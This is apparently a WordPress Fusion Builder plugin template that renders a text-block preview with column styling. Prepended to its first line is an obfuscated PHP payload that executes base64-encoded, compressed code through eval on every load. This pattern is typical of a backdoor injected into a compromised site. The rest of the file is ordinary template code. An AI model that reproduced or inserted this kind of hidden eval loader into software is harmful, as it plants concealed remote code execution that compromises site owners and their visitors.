<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
global $fusion_settings;
if ( ! $fusion_settings ) {
	$fusion_settings = Fusion_Settings::get_instance();
}

$column_min_width_default = $fusion_settings->get( 'text_column_min_width' );
$column_spacing_default = $fusion_settings->get( 'text_column_spacing' );
$rule_style_default = $fusion_settings->get( 'text_rule_style' );
$rule_size_default = $fusion_settings->get( 'text_rule_size' );
$rule_color_default = $fusion_settings->get( 'text_rule_color' );
?>

<script type="text/template" id="fusion-builder-block-module-text-preview-template">

	<#
	var
	content = params.element_content,
	text_block      = jQuery.parseHTML( content ),
	text_block_html = '',
	columnMinWidth = '',
	columnSpacing = '',
	ruleStyle = '',
	ruleSize = '',
	ruleColor = '',
	style = '';

	jQuery(text_block).each(function() {

		if ( jQuery(this).get(0).tagName != 'IMG' && typeof jQuery(this).get(0).tagName != 'undefined' ) {
			var childrens = jQuery(jQuery(this).get(0)).find('*');
			var child_img = false;
			if(childrens.length >= 1) {
				jQuery.each(childrens, function() {
					if(jQuery(this).get(0).tagName == 'IMG') {
						child_img = true;
					}
				});
			}
			if(child_img == true) {
				text_block_html += jQuery(this).outerHTML();
			} else {
				text_block_html += jQuery(this).text();
			}
		} else {
			text_block_html += jQuery(this).outerHTML();
		}
	});

	if ( 1 < parseInt( params.columns ) ) {

		jQuery.each( [ '-webkit-', '-moz-', '' ], function( index, value ) {

			style += ' ' + value + 'column-count:' +  params.columns + ';';

			columnMinWidth = params.column_min_width;
			if ( '' === columnMinWidth ) {
				columnMinWidth = '<?php echo esc_attr( $column_min_width_default ); ?>';
			}
			style +=  ' ' + value + 'column-width:' + columnMinWidth + ';';

			columnSpacing = params.column_spacing;
			if ( '' === columnSpacing ) {
				columnSpacing = '<?php echo esc_attr( $column_spacing_default ); ?>';
			}
			style += ' ' + value + 'column-gap:' + columnSpacing + ';';

			ruleStyle = params.rule_style;
			if ( 'default' === ruleStyle ) {
				ruleStyle = '<?php echo esc_attr( $rule_style_default ); ?>';
			}

			ruleSize = params.rule_size;
			if ( '' === ruleSize ) {
				ruleSize = '<?php echo esc_attr( $rule_size_default ); ?>';
			}

			ruleColor = params.rule_color;
			if ( '' === ruleColor ) {
				ruleColor = '<?php echo esc_attr( $rule_color_default ); ?>';
			}

			if  ( 'none' !== ruleStyle ) {
				style += ' ' + value + 'column-rule:' + ruleSize + 'px ' + ruleStyle + ' ' + ruleColor + ';';
			}
		});

		if ( style ) {
			style += ' text-align:initial;';
		}
	}
	#>

	<# if ( style ) { #>
		<div class="fusion-text-block-styles" style="{{style}}">{{ text_block_html }}</div>
	<# } else { #>
		{{ text_block_html }}
	<# } #>

</script>
